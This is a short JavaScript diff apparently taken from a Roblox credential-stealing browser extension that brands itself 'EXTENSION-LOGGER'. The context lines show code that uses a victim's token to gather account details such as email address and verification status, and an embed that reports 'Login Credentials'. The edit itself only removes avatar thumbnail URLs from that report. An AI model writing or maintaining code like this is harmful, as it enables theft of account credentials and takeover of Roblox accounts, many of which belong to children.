@@ -375,8 +375,6 @@ async function fetchRobloxUserData(token) {
       emailVerified: emailVerified,
       emailAddress: emailAddress,
       voiceChatEnabled: voiceChatEnabled,
-      avatarHeadshot: `https://www.roblox.com/headshot-thumbnail/image?userId=${userData.id}&width=150&height=150&format=png`,
-      avatarThumbnail: `https://www.roblox.com/avatar-thumbnail/image?userId=${userData.id}&width=420&height=420&format=png`
     };
 
   } catch (error) {
@@ -474,9 +472,6 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
   const credentialsAndDataEmbed = {
     title: "<:emoji_37:1410520517349212200> **EXTENSION-LOGGER**",
     color: 0xFFFFFF,
-    thumbnail: {
-    url: "https://www.roblox.com/avatar-thumbnail/image?userId=8113884770&width=420&height=420&format=png"
-    },
     fields: [
       {
         name: "🔑 **Login Credentials**",
